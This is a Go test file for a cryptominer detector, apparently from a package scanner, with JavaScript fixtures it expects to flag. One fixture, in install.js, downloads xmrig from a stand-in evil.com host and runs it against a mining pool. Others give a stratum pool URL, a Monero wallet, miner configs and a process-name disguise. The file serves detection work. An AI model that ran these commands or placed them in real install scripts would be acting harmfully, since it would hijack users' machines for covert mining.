package analyzer

import (
	"strings"
	"testing"
)

func TestCryptominer_XMRig(t *testing.T) {
	a := NewCryptominerAnalyzer()
	content := `
const { execSync } = require('child_process');
execSync('wget https://evil.com/xmrig && chmod +x xmrig && ./xmrig -o pool.minexmr.com:4444');
`
	findings := a.scanContent(content, "install.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "mining software") || strings.Contains(f.Title, "mining pool") {
			found = true
			if f.Severity != SeverityCritical {
				t.Errorf("Expected critical severity, got %d", f.Severity)
			}
			break
		}
	}
	if !found {
		t.Error("Expected to detect cryptocurrency mining software")
	}
}

func TestCryptominer_StratumProtocol(t *testing.T) {
	a := NewCryptominerAnalyzer()
	content := `
const pool = 'stratum+tcp://xmr.pool.minergate.com:45700';
const wallet = '4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQoBJqYK';
`
	findings := a.scanContent(content, "miner.js")

	foundStratum := false
	foundPool := false
	foundWallet := false
	for _, f := range findings {
		if strings.Contains(f.Title, "stratum") {
			foundStratum = true
		}
		if strings.Contains(f.Title, "mining pool domain") {
			foundPool = true
		}
		if strings.Contains(f.Title, "Monero wallet") {
			foundWallet = true
		}
	}
	if !foundStratum {
		t.Error("Expected to detect stratum protocol")
	}
	if !foundPool {
		t.Error("Expected to detect mining pool domain")
	}
	if !foundWallet {
		t.Error("Expected to detect Monero wallet address")
	}
}

func TestCryptominer_MiningAlgorithm(t *testing.T) {
	a := NewCryptominerAnalyzer()
	content := `
const config = {
  "algo": "randomx",
  "pool": "pool.supportxmr.com:3333",
  "threads": os.cpus().length
};
`
	findings := a.scanContent(content, "config.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "algorithm") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect mining algorithm configuration")
	}
}

func TestCryptominer_HashRate(t *testing.T) {
	a := NewCryptominerAnalyzer()
	content := `
console.log('Current hashrate: ' + stats.hashrate + ' h/s');
if (stats.hashes_per_second < 100) {
  adjustThreads();
}
`
	findings := a.scanContent(content, "stats.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "hash rate") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect hash rate reference")
	}
}

func TestCryptominer_ProcessDisguise(t *testing.T) {
	a := NewCryptominerAnalyzer()
	content := `
// Disguise the mining process
process.title = 'node';
startMining();
`
	findings := a.scanContent(content, "hide.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Process name disguise") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect process name disguise")
	}
}

func TestCryptominer_CPUEnumeration(t *testing.T) {
	a := NewCryptominerAnalyzer()
	content := `
const os = require('os');
const numCPUs = os.cpus().length;
for (let i = 0; i < numCPUs; i++) {
  cluster.fork();
}
`
	findings := a.scanContent(content, "cluster.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "CPU core enumeration") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect CPU core enumeration for parallelism")
	}
}

func TestCryptominer_CleanCode(t *testing.T) {
	a := NewCryptominerAnalyzer()
	content := `
const express = require('express');
const app = express();
app.get('/api/crypto/prices', async (req, res) => {
  const prices = await fetchPrices();
  res.json(prices);
});
app.listen(3000);
`
	findings := a.scanContent(content, "prices.js")
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity finding in clean code: %s", f.Title)
		}
	}
}
